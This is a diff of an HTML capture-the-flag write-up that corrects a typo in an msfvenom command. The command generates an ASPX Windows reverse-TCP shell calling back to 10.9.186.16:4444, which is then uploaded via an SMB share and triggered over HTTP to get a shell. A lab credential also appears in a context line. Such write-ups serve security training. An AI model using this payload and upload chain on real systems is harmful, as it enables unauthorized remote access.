@@ -230,7 +230,7 @@ Bill - Juw4nnaM4n420696969!&lt;span class="nv"&gt;$$$ &lt;/span&gt;
 
 &lt;p&gt;Since those web services are all powered by IIS servers, &lt;code&gt;.aspx&lt;/code&gt; ought to be our best option as payload output:&lt;/p&gt;
 
-&lt;div class="highlight"&gt;&lt;pre class="highlight shell"&gt;&lt;code&gt;msfvenom &lt;span class="nt"&gt;-p&lt;/span&gt; windows/x64/shell_reverse_tcp &lt;span class="nv"&gt;LHOST&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;10.9.186.16 &lt;span class="nv"&gt;LPORT&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;4444 &lt;span class="nt"&gt;-f&lt;/span&gt; aspw &lt;span class="nt"&gt;-o&lt;/span&gt; hacky.aspx
+&lt;div class="highlight"&gt;&lt;pre class="highlight shell"&gt;&lt;code&gt;msfvenom &lt;span class="nt"&gt;-p&lt;/span&gt; windows/x64/shell_reverse_tcp &lt;span class="nv"&gt;LHOST&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;10.9.186.16 &lt;span class="nv"&gt;LPORT&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;4444 &lt;span class="nt"&gt;-f&lt;/span&gt; aspx &lt;span class="nt"&gt;-o&lt;/span&gt; hacky.aspx
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;p&gt;We then upload &lt;code&gt;hacky.aspx&lt;/code&gt; to the nt4wrksv share with &lt;code&gt;get hacky.aspx&lt;/code&gt; in SMB and execute the payload through HTTP (&lt;a href="http://TARGET-IP:49663/nt4wrksv/hacky.aspx" rel="nofollow"&gt;http://TARGET-IP:49663/nt4wrksv/hacky.aspx&lt;/a&gt;), instantly granting us a shell to our target and access to the output of &lt;code&gt;User.txt&lt;/code&gt;.&lt;/p&gt;
